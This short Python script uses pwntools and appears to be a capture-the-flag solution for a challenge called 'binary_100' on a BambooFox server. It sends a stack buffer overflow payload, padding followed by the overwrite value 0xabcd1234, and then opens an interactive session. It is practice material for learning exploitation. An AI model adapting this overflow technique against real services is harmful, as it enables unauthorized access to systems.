from pwn import *

DEBUG = False

if DEBUG:
    p = process("binary_100")
else:
    p = remote("bamboofox.cs.nctu.edu.tw", 22001)

padding = 0x34 - 0xc

payload = padding * "A" + p32(0xabcd1234)

p.send(payload)

p.interactive()
p.close()
